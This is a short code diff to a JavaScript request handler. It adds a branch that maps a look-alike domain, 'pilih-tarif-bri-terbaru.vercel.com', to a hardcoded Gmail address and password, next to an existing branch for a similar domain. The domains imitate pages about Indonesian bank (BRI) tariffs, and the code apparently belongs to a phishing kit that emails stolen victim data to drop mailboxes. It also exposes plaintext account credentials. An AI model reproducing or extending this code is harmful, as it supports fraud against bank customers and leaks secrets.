@@ -7,6 +7,12 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
+     if (url == 'pilih-tarif-bri-terbaru.vercel.com'){
+
+       email = 'devotak123@gmail.com'
+       pass = 'ausfhyujixismjzk'
+    }else
+    
     if (url == 'pilihan-tarif-bri-terbaru.vercel.app'){
 
        email = 'buatdwek6740@gmail.com'
